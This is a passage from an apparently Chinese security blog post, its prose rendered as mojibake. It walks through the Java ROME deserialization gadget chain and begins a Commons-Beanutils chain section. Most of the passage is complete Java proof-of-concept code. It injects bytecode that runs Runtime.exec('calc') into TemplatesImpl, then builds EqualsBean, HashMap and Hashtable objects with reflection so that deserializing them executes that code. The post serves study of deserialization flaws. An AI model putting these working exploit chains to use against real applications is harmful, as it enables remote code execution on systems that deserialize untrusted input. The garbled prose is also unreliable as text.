ï¼š\næˆ‘æƒ³åˆ°äº†ä¸€ä¸ªç‚¹ï¼Œæ˜¯å¦å¯ä»¥è®©è¿™é‡Œçš„pdsä¸ºnullï¼Œä»è€Œåœ¨åºåˆ—åŒ–å‰ä¸è¿›å…¥ifæ¡ä»¶ä»è€Œä¸ä¼šè°ƒç”¨åˆ°getteræ–¹æ³•ï¼Œåœ¨putæ–¹æ³•è¿‡åå†åå°„ä¿®æ”¹å€¼å‘¢ï¼Ÿ\né‚£ä¹ˆè¿™ä¸ªpdså˜é‡çš„èµ‹å€¼ä¹Ÿæ˜¯åˆ†æè¿‡çš„ï¼Œæ‰€ä»¥å¯ä»¥å°è¯•æ‰¾æ²¡æœ‰getterå’Œsetteræ–¹æ³•çš„classå¯¹è±¡ï¼Ÿ\nä¸»è¦æ˜¯è¦æ»¡è¶³å¦‚ä¸‹æ¡ä»¶ï¼š\nä¹Ÿå°±æ˜¯è¿™ä¸ªEqualsBeanç±»å®ä¾‹åŒ–æ—¶å¿…é¡»æ»¡è¶³ç›¸å¯¹åº”çš„å®ä¾‹ã€‚æ‰¾äº†ä¸€ä¸‹æ²¡æ‰¾åˆ°ã€‚\nå…¶å®å…·ä½“çš„æ–¹æ³•å¯ä»¥å‚è€ƒåé¢çš„equals()æ–¹æ³•é“¾çš„è§£å†³æ–¹æ³•ï¼Œå…·ä½“æƒ³æ³•å¯ä»¥å…ˆçœ‹åé¢ï¼Œè¿™é‡Œå°±ç»™ä¸€ä¸ªPOCåå†ç®€å•è¯´æ˜ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 package org.example; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.syndication.feed.impl.ToStringBean; import com.sun.syndication.feed.impl.EqualsBean; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; import java.nio.file.Files; import java.nio.file.Paths; import java.util.HashMap; import javax.xml.transform.Templates; import java.io.FileOutputStream; import java.io.FileInputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; public class Main{ public static void main(String[] args) throws Exception { byte[] code = Files.readAllBytes(Paths.get(\u0026#34;D:\\\\maven_text\\\\maven1_text\\\\target\\\\test-classes\\\\org\\\\example\\\\Test.class\u0026#34;)); TemplatesImpl impl = new TemplatesImpl(); setFieldValue(impl,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(impl,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(impl, \u0026#34;_class\u0026#34;, null); setFieldValue(impl, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); ToStringBean bean = new ToStringBean(Templates.class,impl); EqualsBean x = new EqualsBean(String.class,\u0026#34;fupanc\u0026#34;); HashMap hashMap = new HashMap(); hashMap.put(x,\u0026#34;fupanc\u0026#34;); setFieldValue(x,\u0026#34;_beanClass\u0026#34;,ToStringBean.class); setFieldValue(x,\u0026#34;_obj\u0026#34;,bean); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(hashMap); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } ç®€å•è¯´æ˜ä¸€ä¸‹ï¼Œè¿™é‡Œè®²ObjectBeanç±»éƒ½æ¢æˆäº†ç›¸å¯¹åº”çš„ç±»ï¼Œå¹¶ä¸”å…¶å®è¿™é‡Œæœ€ç»ˆè°ƒç”¨çš„éƒ½æ˜¯ç›¸å¯¹åº”çš„ç±»ï¼š\nå¯¹äºè¿™é‡Œçš„hashCode()ï¼Œå…¶å®è°ƒç”¨çš„å°±æ˜¯EqualsBeanç±»çš„beanHashCode()æ–¹æ³•ï¼š\nä¹Ÿå°±æ˜¯æ¼æ´è§¦å‘ç‚¹ï¼š\nåœ¨è¿™é‡Œï¼Œæˆ‘æ˜¯å°†EqualsBeanèµ‹å€¼æ—¶ä¹Ÿæ˜¯ç›¸å¯¹åº”çš„String.classå’Œ\u0026quot;fupanc\u0026quot;ï¼Œç¬¦åˆEqualsBeanç±»çš„æ„é€ å‡½æ•°æ–¹æ³•ï¼Œä¸»è¦çš„ä¸åŒç‚¹å°±æ˜¯ä¸Šé¢çš„beanHashCode()æ–¹æ³•ï¼ŒåŸå…ˆçš„POCä¸­æ˜¯ä¼šç›´æ¥è°ƒç”¨åˆ°toString()æ–¹æ³•è§¦å‘ä¸€æ¬¡è°ƒç”¨é“¾çš„ï¼Œä½†æ˜¯åœ¨è¿™é‡Œï¼Œæˆ‘å°†è¿™ä¸ª_objå˜é‡èµ‹å€¼ä¸ºäº†ä¸€ä¸ªå­—ç¬¦ä¸²å®ä¾‹ï¼Œæ‰€ä»¥è¿™é‡Œå°±æ˜¯ä¸€ä¸ªå•çº¯çš„ç®—hashçš„è¿‡ç¨‹ï¼š\né‚£ä¹ˆåç»­å°±æ˜¯æˆåŠŸå¾€hashMapä¸­æ”¾è¿›äº†é”®å€¼å¯¹ï¼Œç„¶ååœ¨ååºåˆ—åŒ–æ—¶ä¹Ÿæ˜¯ç¬¦åˆé¢„æœŸçš„ï¼š\nå¹¶ä¸”è¿è¡Œååªåœ¨ååºåˆ—åŒ–æ—¶å¼¹å‡ºä¸€ä¸ªè®¡ç®—æœºï¼ŒæˆåŠŸä¿®æ”¹ã€‚\nç­‰å¦‚HashSetã€HashtableåŸºæœ¬éƒ½å·®ä¸å¤šï¼Œå¦‚æœè¿‡æ»¤HashMapæ—¶è¦æƒ³åˆ°è¿™äº›ã€‚\nequals()s è¿˜æ˜¯å…ˆæ¥ç»™å‡ºåŸºæœ¬ç›˜ï¼š Test.java:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 package org.example; import java.io.IOException; import com.sun.org.apache.xalan.internal.xsltc.DOM; import com.sun.org.apache.xalan.internal.xsltc.TransletException; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator; import com.sun.org.apache.xml.internal.serializer.SerializationHandler; public class Test extends AbstractTranslet { public Test() throws IOException { Runtime.getRuntime().exec(\u0026#34;calc\u0026#34;); } @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException { } @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException { } } Main.javaï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 package org.example; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; import java.nio.file.Files; import java.nio.file.Paths; public class Main{ public static void main(String[] args) throws Exception { byte[] code = Files.readAllBytes(Paths.get(\u0026#34;D:\\\\maven_text\\\\maven1_text\\\\target\\\\test-classes\\\\org\\\\example\\\\Test.class\u0026#34;)); TemplatesImpl impl = new TemplatesImpl(); setFieldValue(impl,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(impl,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(impl, \u0026#34;_class\u0026#34;, null); setFieldValue(impl, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } ç°åœ¨è¿˜æ˜¯æ¥æƒ³å¦‚ä½•å°†åŸºæœ¬ç›˜æ¥å…¥Hashtableç±»ã€‚\né‡ç‚¹è¿˜æ˜¯åœ¨äºreadObject()è°ƒç”¨çš„reconstitutionPut()ï¼š ä¸‹é¢æ¥åˆ†æä¸€ä¸‹ã€‚\nå…ˆä»åºåˆ—åŒ–è¿‡ç¨‹è¯´èµ·ã€‚å†æ€»ç»“ä¸€ä¸‹å‰é¢çš„éœ€æ±‚ï¼š 1.é¦–å…ˆå°±æ˜¯è°ƒç”¨åˆ°çš„ObjectBeançš„equals()æ–¹æ³•ï¼Œç°åœ¨ç€é‡çœ‹å‚æ•°ï¼š è¿™é‡Œä¼ å…¥çš„otherå‚æ•°ï¼Œç»§ç»­çœ‹beanEquals()æ–¹æ³•ï¼š ä¹Ÿå°±æ˜¯è¿™é‡Œçš„objï¼Œå•çº¯å¯¹objæ¥è¯´å°±è¿™å‰é¢çš„åˆ©ç”¨ï¼Œç”±äºæˆ‘ä»¬æƒ³è¦æ­£å¸¸åˆ©ç”¨åé¢çš„invoke()æ–¹æ³•ï¼Œæ‰€ä»¥éœ€è¦æ»¡è¶³this._beanClass.isInstance(obj)ï¼Œè¿™æ ·æ‰ä¼šè¿›å…¥elseæ‰§è¡Œæˆ‘ä»¬æƒ³ç”¨çš„ä»£ç ã€‚åœ¨è¿™é‡Œæˆ‘ä¼šå°è¯•ä¼ å…¥ä¸€ä¸ªTemplatesImplå®ä¾‹ï¼Œä½†æ˜¯çœŸæ­£åˆ©ç”¨çš„å´å¹¶ä¸æ˜¯è¿™ä¸ªä¼ å…¥çš„TemplatesImplç±»å®ä¾‹ï¼Œçœ‹åˆ©ç”¨ä»£ç ï¼š\nä¹Ÿæ˜¯ä¹‹å‰ä¸€ç›´è¯´çš„ï¼ŒåŠ¨æ€åŠ è½½å­—èŠ‚ç åä¼šç›´æ¥æŠ¥å¼‚å¸¸ç„¶åé€€å‡ºï¼Œæ‰€ä»¥è¿™é‡ŒçœŸæ­£åˆ©ç”¨åˆ°çš„å…¶å®åªæ˜¯è¿™ä¸ªbean1ï¼Œè€Œè¿™ä¸ªbean1å¯¹åº”çš„æ˜¯_objè¿™ä¸ªå˜é‡ï¼Œé‚£ä¸ªè¿™é‡Œçš„bean1ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬æ„é€ çš„å‚æ•°ä¼ é€’çš„å€¼ï¼Œèµ·çš„çœŸæ­£ä½œç”¨æ˜¯ä»€ä¹ˆï¼Œå°±æ˜¯ä¸ºäº†æ»¡è¶³this._beanClass.isInstance(obj)ï¼Œä¹Ÿå°±åªæœ‰è¿™ä¸ªä½œç”¨äº†ï¼Œå…·ä½“å‚æ•°ä¼ é€’åé¢ä¼šè®²ï¼Œä½œç”¨ä¹Ÿå°±æ˜¯è¿™ä¸ªã€‚\n2.ç°åœ¨å†æ¥çœ‹ä¸€ä¸‹Hashtableçš„putæ–¹æ³•ï¼š\nå¦‚ä½•è§¦å‘equals()æ–¹æ³•ï¼Œè‡ªå·±æƒ³äº†ä¸€ä¸‹ï¼Œæœ¬æ¥æƒ³ç›´æ¥ä¼ å…¥ObjectBeanç±»å®ä¾‹çš„ï¼Œä½†æ˜¯å¯¹äºè¿™é‡Œçš„hashç›¸ç­‰ä¸ä¸€å®šã€‚\nçœ‹äº†ä¸€ä¸‹niviaå¸ˆå‚…çš„æ–‡ç« ï¼Œè°ƒç”¨çš„æ˜¯HashMapçš„equals()æ–¹æ³•ï¼Œè¿™ä¸ªequals()æ–¹æ³•è°ƒç”¨è¿‡ç¨‹æ˜¯å’ŒCC7çš„é‚£æ¡é“¾å·®ä¸å¤šçš„ã€‚\nç°åœ¨å†æ¥çœ‹ä¸€ä¸‹HashMapçš„equals()è°ƒç”¨è¿‡ç¨‹ï¼š\nHashMapçˆ¶ç±»AbstractMapçš„equals()æ–¹æ³•ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 public boolean equals(Object o) { if (o == this) return true; if (!(o instanceof Map)) return false; Map\u0026lt;?,?\u0026gt; m = (Map\u0026lt;?,?\u0026gt;) o; if (m.size() != size()) return false; try { Iterator\u0026lt;Entry\u0026lt;K,V\u0026gt;\u0026gt; i = entrySet().iterator(); while (i.hasNext()) { Entry\u0026lt;K,V\u0026gt; e = i.next(); K key = e.getKey(); V value = e.getValue(); if (value == null) { if (!(m.get(key)==null \u0026amp;\u0026amp; m.containsKey(key))) return false; } else { if (!value.equals(m.get(key))) return false; } } } catch (ClassCastException unused) { return false; } catch (NullPointerException unused) { return false; } return true; } åœ¨è¿™ä¸ªæ–¹æ³•ä»£ç é‡Œé¢è¿˜æœ‰ä¸€å¤„æ˜¯è°ƒç”¨çš„equals\nå°±æ˜¯è¿™é‡Œï¼Œåªè¦æ§åˆ¶è¿™é‡Œçš„valueä¸ºObjectBeanç±»å®ä¾‹å³å¯ã€‚\nç»“åˆå‰é¢çš„éœ€æ±‚ï¼Œæˆ‘ä»¬éœ€è¦ä¼ å…¥ä¸¤ä¸ªï¼Œä¸€ä¸ªæ˜¯HashMapç±»å®ä¾‹ï¼Œè¿˜æœ‰ä¸ªå°±æ˜¯TemplatesImplç±»å®ä¾‹ï¼Œä½†æ˜¯çœ‹è¿™é‡Œå‚æ•°çš„ä¼ é€’ï¼Œå…¶å®å°±æ˜¯m.get(key)ä¸­çš„må¯¹åº”å‰é¢è¯´è¿‡çš„ObjectBeanç±»çš„equals()æ–¹æ³•çš„otherï¼Œç„¶åè¿™é‡Œçš„måˆæ˜¯å¯¹åº”çš„ä¼ å…¥çš„oï¼š\nå³ï¼š è¿™é‡Œçš„keyã€‚\næ‰€ä»¥ç°åœ¨æˆ‘ä»¬æ˜¯éœ€è¦ä¼ å…¥ä¸¤ä¸ªHashMapç±»å®ä¾‹ï¼Œç„¶åè¿™é‡Œå¯¹ç¬¬äºŒä¸ªHashMapç±»è°ƒç”¨getæ—¶å¯ä»¥è¿”å›ä¸€ä¸ªTemplatesImplç±»å®ä¾‹ã€‚æ‰€ä»¥æˆ‘ä»¬éœ€è¦putè¿›å»ã€‚\nè¿™é‡Œæ€»ç»“ä¸€ä¸‹å‰é¢çš„éœ€æ±‚ï¼š\nvalueèµ‹å€¼ä¸ºObjectBeanç±»å®ä¾‹\nä¼ å…¥ä¸¤ä¸ªHashMapç±»å®ä¾‹å¹¶ä¸”éœ€è¦æœ‰TemplatesImplç±»å®ä¾‹çš„å€¼ã€‚\né—®é¢˜è§£å†³ï¼š\nvalueçš„èµ‹å€¼é—®é¢˜ï¼š å°±æ˜¯è¿™ä¸ªï¼Œæ‰€ä»¥æˆ‘ä»¬è¿˜éœ€è¦ç»™HashMapä¼ è¿›å»ä¸€ä¸ªObjectBeanç±»å®ä¾‹çš„å€¼ã€‚åŒæ—¶åœ¨CC7å­¦ä¹ ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥çŸ¥é“è¿™é‡Œçš„eæ˜¯hashMap0ï¼ˆå‡è®¾ä¼šå‘Hashtableä¸­ä¼ å…¥hashMap0å’ŒhashMap1ï¼‰ï¼Œè¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆåœ¨CC7é‚£é‡Œè¦ç§»é™¤yyçš„åŸå› ã€‚\næ ¹æ®è¿™ä¸ªï¼Œæˆ‘ä»¬çš„ä¸¤ä¸ªHashMapç±»å°±éœ€è¦æœ‰é€»è¾‘ã€‚ç›´æ¥ç»™ä»£ç ï¼š\n1 2 3 4 5 6 7 HashMap hashMap0 = new HashMap(); hashMap0.put(\u0026#34;zZ\u0026#34;,bean); hashMap0.put(\u0026#34;yy\u0026#34;,impl); HashMap hashMap1 = new HashMap(); hashMap1.put(\u0026#34;zZ\u0026#34;,impl); hashMap1.put(\u0026#34;yy\u0026#34;,bean); æ¯”å¦‚è¯´å½“å‰é¢æ‹¿åˆ°çš„ç¬¬ä¸€ä¸ªHashMapçš„keyå’Œvalueåˆ†åˆ«ä¸ºzZå’Œbeanï¼Œé‚£ä¹ˆæ­¤æ—¶å¯¹äºæˆ‘ä»¬çš„ç¬¬äºŒä¸ªHashMapè°ƒç”¨çš„å°±æ˜¯get(\u0026ldquo;zZ\u0026rdquo;)ï¼Œè€Œæˆ‘ä»¬è¿™é‡Œéœ€è¦çš„æ˜¯implï¼Œæ‰€ä»¥åœ¨ç¬¬äºŒä¸ªHashMapçš„é”®å€¼å¯¹ä¸­æˆ‘ä»¬å°±éœ€è¦å°†é”®zZçš„å€¼è®¾ç½®ä¸ºimplï¼Œæ‰€ä»¥è¿™é‡Œä¹Ÿæ˜¯éœ€è¦åç€æ¥çš„åŸå› ã€‚\né‚£ä¹ˆåˆæ˜¯ä¸ºä»€ä¹ˆè¦ä¸¤ä¸ªå‘¢ï¼Ÿ\næŒ‰ç†è¯´åº”è¯¥å¦‚ä¸‹ä»£ç å°±è¡Œäº†ï¼š\n1 2 3 4 5 HashMap hashMap0 = new HashMap(); hashMap0.put(\u0026#34;zZ\u0026#34;,bean); HashMap hashMap1 = new HashMap(); hashMap1.put(\u0026#34;zZ\u0026#34;,impl); è¿™æ ·ä¸å°±å·²ç»å¯¹åº”äº†å—ã€‚è¿™å°±ä¸hashå€¼ç›¸ç­‰æœ‰å…³ç³»äº†ï¼Œç»§ç»­çœ‹åé¢ã€‚\nhashå€¼ç›¸åŒçš„é—®é¢˜ï¼š åœ¨å‰é¢ä¹Ÿè¯´è¿‡äº†ï¼Œä¼šä¼ å…¥ä¸¤ä¸ªHashMapç±»ï¼Œæ‰€ä»¥ä¼šè°ƒç”¨HashMapçš„çˆ¶ç±»AbstractMapçš„hashCode()æ–¹æ³•ï¼Œåœ¨CC7ä¹Ÿæœ‰è¯´è¿‡ï¼Œè¿‡ç¨‹ä¸­éœ€è¦æ³¨æ„çš„ç‚¹å°±æ˜¯ï¼š å³åœ¨ç”Ÿæˆå“ˆå¸Œç çš„æ—¶å€™éœ€è¦è€ƒè™‘åˆ°keyå’Œvalueã€‚\næ¯‹åº¸ç½®ç–‘yyå’ŒzZæœ¬èº«å°±å·²ç»å“ˆå¸Œç¢°æ’ç›¸åŒäº†ã€‚åœ¨æˆ‘ä»¬ä¹‹å‰çš„æå‡ºçš„ç–‘é—®ï¼šä¸ºå•¥è®¾ç½®ä¸¤ä¸ªï¼Œè¿™é‡Œå°±èƒ½ç»™å‡ºç­”æ¡ˆï¼šåƒå‰é¢é‚£æ ·åªè®¾ç½®ä¸€ä¸ªï¼Œkeyæ˜¯ç›¸åŒäº†ï¼Œä½†æ˜¯è¿™é‡Œçš„valueæ˜¯è‚¯å®šä¸ç›¸åŒçš„ã€‚\næ‰€ä»¥æˆ‘ä»¬éœ€è¦è®¾ç½®ä¸¤ä¸ªï¼š\n1 2 3 4 5 6 7 HashMap hashMap0 = new HashMap(); hashMap0.put(\u0026#34;zZ\u0026#34;,bean); hashMap0.put(\u0026#34;yy\u0026#34;,impl); HashMap hashMap1 = new HashMap(); hashMap1.put(\u0026#34;zZ\u0026#34;,impl); hashMap1.put(\u0026#34;yy\u0026#34;,bean); â€”â€”â€”â€”â€”â€”\nç°åœ¨å°±å¯ä»¥å°è¯•ä¸€ä¸‹æ„é€ ä»£ç äº†ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 package org.example; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; import java.nio.file.Files; import java.nio.file.Paths; import javax.xml.transform.Templates; import java.util.Hashtable; import com.sun.syndication.feed.impl.ObjectBean; import java.util.HashMap; import java.io.FileOutputStream; import java.io.FileInputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; public class Main{ public static void main(String[] args) throws Exception { byte[] code = Files.readAllBytes(Paths.get(\u0026#34;D:\\\\maven_text\\\\maven1_text\\\\target\\\\test-classes\\\\org\\\\example\\\\Test.class\u0026#34;)); TemplatesImpl impl = new TemplatesImpl(); setFieldValue(impl,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(impl,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(impl, \u0026#34;_class\u0026#34;, null); setFieldValue(impl, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); ObjectBean bean = new ObjectBean(Templates.class,impl); Hashtable hash = new Hashtable(); HashMap hashMap0 = new HashMap(); hashMap0.put(\u0026#34;zZ\u0026#34;,bean); hashMap0.put(\u0026#34;yy\u0026#34;,impl); HashMap hashMap1 = new HashMap(); hashMap1.put(\u0026#34;zZ\u0026#34;,impl); hashMap1.put(\u0026#34;yy\u0026#34;,bean); hash.put(hashMap0,1); hash.put(hashMap1,1); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(hash); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } è¿è¡Œååªå¼¹å‡ºä¸€ä¸ªè®¡ç®—æœºï¼Œé‚£ä¹ˆåªèƒ½æ˜¯åºåˆ—åŒ–çš„æ—¶å€™å¼¹å‡ºæ¥çš„ï¼Œæ‰“æ–­ç‚¹è°ƒè¯•ä¸€ä¸‹ï¼Œå‘ç°ç¡®å®æ˜¯éƒ½æ²¡æœ‰è¿›å…¥åºåˆ—åŒ–éƒ¨åˆ†ï¼Œå¹¶ä¸”æ˜¯æ— æ³•æ”¾å…¥ç¬¬äºŒä¸ªé”®å€¼å¯¹çš„ï¼š\nè§£å†³æ–¹æ³•ï¼Œè¿˜æ˜¯åå°„æ›´æ”¹ï¼Œä»£ç å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 package org.example; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; import java.nio.file.Files; import java.nio.file.Paths; import javax.xml.transform.Templates; import java.util.Hashtable; import com.sun.syndication.feed.impl.ObjectBean; import java.util.HashMap; import com.sun.syndication.feed.impl.EqualsBean; import java.io.FileOutputStream; import java.io.FileInputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; public class Main{ public static void main(String[] args) throws Exception { byte[] code = Files.readAllBytes(Paths.get(\u0026#34;D:\\\\maven_text\\\\maven1_text\\\\target\\\\test-classes\\\\org\\\\example\\\\Test.class\u0026#34;)); TemplatesImpl impl = new TemplatesImpl(); setFieldValue(impl,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(impl,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(impl, \u0026#34;_class\u0026#34;, null); setFieldValue(impl, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); EqualsBean bean = new EqualsBean(String.class,\u0026#34;fupanc\u0026#34;); Hashtable hash = new Hashtable(); HashMap hashMap0 = new HashMap(); hashMap0.put(\u0026#34;zZ\u0026#34;,bean); hashMap0.put(\u0026#34;yy\u0026#34;,impl); HashMap hashMap1 = new HashMap(); hashMap1.put(\u0026#34;zZ\u0026#34;,impl); hashMap1.put(\u0026#34;yy\u0026#34;,bean); hash.put(hashMap0,1); hash.put(hashMap1,1); setFieldValue(bean,\u0026#34;_beanClass\u0026#34;,Templates.class); setFieldValue(bean,\u0026#34;_obj\u0026#34;,impl); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(hash); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } ç®€å•è¯´æ˜ä¸€ä¸‹ï¼ŒEqualsBeanç±»ä¸ç”¨è¯´äº†ï¼Œå°±æ˜¯ObjectBeanç±»å®ä¾‹ç”¨çš„é‚£ä¸ªã€‚ObjectBeanç±»çš„equals()æ–¹æ³•ä¹Ÿæ˜¯æŒ‡å‘çš„æˆ‘ä»¬è¦åˆ©ç”¨çš„é‚£ä¸ªï¼š å¯¹äºåå°„ä¿®æ”¹ï¼Œè¿˜æ˜¯å¾ˆå¦™çš„ï¼Œç›´æ¥åœ¨ä¸‹é¢è¿™ä¸€æ­¥å°±æ–­å‡ºå»äº†å¹¶ä¸”æ²¡æœ‰å½±å“åŸºæœ¬çš„èµ‹å€¼é—®é¢˜ï¼š å› ä¸ºä¼ å…¥çš„TemplatesImplç±»å®ä¾‹å’ŒString.classä¸æ˜¯ç›¸å¯¹åº”çš„ï¼Œæ‰€ä»¥æ²¡æœ‰è¿›å…¥ä¸‹é¢çš„åŠ è½½å­—èŠ‚ç çš„è¿‡ç¨‹ã€‚ç›´æ¥è®²eqèµ‹å€¼ä¸ºäº†falseï¼Œå¹¶ä¸”åœ¨æœ€åæ˜¯è¿”å›äº†è¿™ä¸ªå€¼çš„ï¼š\nä¹Ÿå°±æ˜¯è¯´è¿™é‡Œè°ƒç”¨equals()æ–¹æ³•åæœ€åè¿”å›çš„æ˜¯falseï¼ŒæˆåŠŸæ”¾å…¥äº†ç¬¬äºŒä¸ªé”®å€¼å¯¹ï¼Œä¸ä¼šè¦†ç›–ï¼š\néå¸¸å¦™ï¼ŒåŒæ—¶ä¼ å…¥fupancï¼Œæ˜¯ä¸ºäº†è®©equalsBeanèƒ½å¤ŸæˆåŠŸå®ä¾‹åŒ–ï¼š\næ‰€ä»¥æœ€ç»ˆPOCä¸ºï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 package org.example; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; import java.nio.file.Files; import java.nio.file.Paths; import javax.xml.transform.Templates; import java.util.Hashtable; import com.sun.syndication.feed.impl.ObjectBean; import java.util.HashMap; import com.sun.syndication.feed.impl.EqualsBean; import java.io.FileOutputStream; import java.io.FileInputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; public class Main{ public static void main(String[] args) throws Exception { byte[] code = Files.readAllBytes(Paths.get(\u0026#34;D:\\\\maven_text\\\\maven1_text\\\\target\\\\test-classes\\\\org\\\\example\\\\Test.class\u0026#34;)); TemplatesImpl impl = new TemplatesImpl(); setFieldValue(impl,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(impl,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(impl, \u0026#34;_class\u0026#34;, null); setFieldValue(impl, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); EqualsBean bean = new EqualsBean(String.class,\u0026#34;fupanc\u0026#34;); Hashtable hash = new Hashtable(); HashMap hashMap0 = new HashMap(); hashMap0.put(\u0026#34;zZ\u0026#34;,bean); hashMap0.put(\u0026#34;yy\u0026#34;,impl); HashMap hashMap1 = new HashMap(); hashMap1.put(\u0026#34;zZ\u0026#34;,impl); hashMap1.put(\u0026#34;yy\u0026#34;,bean); hash.put(hashMap0,1); hash.put(hashMap1,1); setFieldValue(bean,\u0026#34;_beanClass\u0026#34;,Templates.class); setFieldValue(bean,\u0026#34;_obj\u0026#34;,impl); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(hash); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } æˆåŠŸæŒ‰ç…§é¢„æœŸå¼¹å‡ºä¸€ä¸ªè®¡ç®—æœºï¼Œè°ƒè¯•ä¹Ÿæ²¡é—®é¢˜ã€‚\nOKï¼ŒROMEé“¾å®Œç»“ã€‚\n","date":"2025-01-22T14:11:49+08:00","permalink":"https://fupanc-w1n.github.io/p/rome%E9%93%BE/","title":"Romeé“¾"},{"content":"CBé“¾ ç¯å¢ƒé…ç½® ç¯å¢ƒé…ç½® pom.xmlæ·»åŠ ï¼š\n1 2 3 4 5 6 7 8 9 10 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;commons-beanutils\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;commons-beanutils\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.8.3\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;commons-logging\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;commons-logging\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.2\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; æµ‹è¯•ç¯å¢ƒ commons-beanutils 1.8.3 commons-logging:commons-logging:1.2 JDK 8u411 commons-collections3.2.1 è¿™é‡Œéœ€è¦3.2.1çš„åŸå› 